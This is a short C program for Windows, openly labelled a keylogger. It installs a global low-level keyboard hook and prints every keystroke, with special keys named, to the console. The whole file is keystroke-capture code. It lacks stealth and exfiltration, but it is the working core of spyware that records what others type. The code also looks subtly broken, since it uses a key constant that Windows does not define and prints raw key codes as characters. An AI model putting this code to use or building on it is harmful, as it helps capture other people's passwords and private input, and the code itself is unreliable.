// see "https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa"
#include<windows.h>
#include<stdio.h>

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
    if(wParam == WM_KEYDOWN)
    {
        switch(pkey->vkCode)
        {
            case VK_ENTER:
                printf("(ENTER)");
                break;
            case VK_BACK:
                printf("(BACKSPACE)");
                break;
            case VK_SPACE:
                printf("(SPACEBAR)");
                break;
            case VK_LSHIFT:
                printf("(SHIFT)");
                break;
            case VK_TAB:
                printf("(TAB)");
                break;    
            case VK_ESCAPE:
                printf("(ESC)");
                break;
            case VK_CONTROL:
                printf("(CTRL)");
                break;
            case VK_MENU:
                printf("(ALT)");
                break;
            case VK_CAPITAL:
                printf("(CAPS_LOCK)");
                break;
            case VK_DELETE:
                printf("(DEL)");
                break;
            case VK_LEFT:
                printf("(LEFT_ARROW)");
                break;
            case VK_RIGHT:
                printf("(RIGHT_ARROW)");
                break;
            case VK_UP:
                printf("(UP_ARROW)");
                break;
            case VK_DOWN:
                printf("(DOWN_ARROW)");
                break;
            case VK_HOME:
                printf("(HOME)");
                break;
            case VK_END:
                printf("(END)");
                break;
            case VK_PRIOR:
                printf("(PAGE_UP)");
                break;
            case VK_NEXT:
                printf("(PAGE_DOWN)");
                break;
            case VK_INSERT:
                printf("(INSERT)");
                break;
            case VK_F1:
                printf("(F1)");
                break;
            case VK_F2:
                printf("(F2)");
                break;
            case VK_F3:
                printf("(F3)");
                break;
            case VK_F4:
                printf("(F4)");
                break;
            case VK_F5:
                printf("(F5)");
                break;
            case VK_F6:
                printf("(F6)");
                break;
            case VK_F7:
                printf("(F7)");
                break;
            case VK_F8:
                printf("(F8)");
                break;
            case VK_F9:
                printf("(F9)");
                break;
            case VK_F10:
                printf("(F10)");
                break;
            case VK_F11:
                printf("(F11)");
                break;
            case VK_F12:
                printf("(F12)");
                break;
            case VK_NUMLOCK:
                printf("(NUM_LOCK)");
                break;
            case VK_SCROLL:
                printf("(SCROLL_LOCK)");
                break;
            case VK_RSHIFT:
                printf("(RIGHT_SHIFT)");
                break;
            case VK_LCONTROL:
                printf("(LEFT_CTRL)");
                break;
            case VK_RCONTROL:
                printf("(RIGHT_CTRL)");
                break;
            case VK_LMENU:
                printf("(LEFT_ALT)");
                break;
            case VK_RMENU:
                printf("(RIGHT_ALT)");
                break;
            case VK_PAUSE:
                printf("(PAUSE)");
                break;
            case VK_PRINT:
                printf("(PRINT_SCREEN)");
                break;
            default:
                printf("%c", pkey->vkCode);
                break;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main()
{
    printf("keylogger started\n");
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if(hhook == NULL)
          printf("hook wasn't installed\n");
    printf("hook installed\n");
    MSG msg;
    while((GetMessage(&msg, NULL, 0, 0)) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}